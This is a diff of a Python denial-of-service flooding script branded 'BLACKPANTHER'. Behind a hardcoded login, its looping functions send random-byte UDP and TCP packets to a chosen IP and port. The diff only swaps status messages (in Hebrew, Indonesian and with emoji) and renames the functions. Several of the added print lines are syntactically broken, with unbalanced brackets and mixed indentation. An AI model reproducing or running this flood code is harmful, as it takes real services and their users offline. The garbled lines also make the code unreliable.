@@ -51,7 +51,7 @@ while attemps < 100:
     password = input("\033[94mEnter your password: \033[0m")
 
     if username == 'n0lk0ma' and password == 'n0lk0ma':
-        print("\033[33m★★★Hai...kamu berhasil login di BLACKPANTHER!!★★★\033[0m")
+        print("\033[33mHai...kamu berhasil login di BLACKPANTHER!!\033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -74,12 +74,12 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i + "Attack Sent!!!")
+			print(i + "\033[32mלתקוף את פרוטוקול הנתונים של המשתמש\033[0m")
 		except:
-			print("[!] Error!!!")
+			print(💥 ["\033[97mError!!!\033[0m")
 
 
-def run3():
+def run2():
 	data = random._urandom(999)
 	i = random.choice(("[+]"))
 	while true:
@@ -89,13 +89,13 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[33mלתקוף את פרוטוקול הנתונים של המשתמש\033[0m")
+                        print(i + "\033[32mRequest Attack tcp::..\033[0m")
 		except:
 			s.close()
 			print("[💥] \033[31mError!!!\033[0m")
             
 
-def run4():
+def run3():
 	data = random._urandom(818)
 	i = random.choice(("[+]"))
 	while True:
@@ -105,13 +105,13 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i + " \033[95mSending Massage\033[0m")
 		except:
 			s.close()
-			print("[-] Error!!!")
+			print(💥 ["\033[31mMaybe down...!\033[0m")
             
   
-def run5():
+def run4():
 	data = random._urandom(16)
 	i = random.choice(("[+]"))
 	while True:
@@ -121,10 +121,10 @@ def run5():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
 		except:
 			s.close()
-			print("[-] Error!!!")
+			print(👽 ["\033[31mError!!!\033[0m"])
 
 
 											
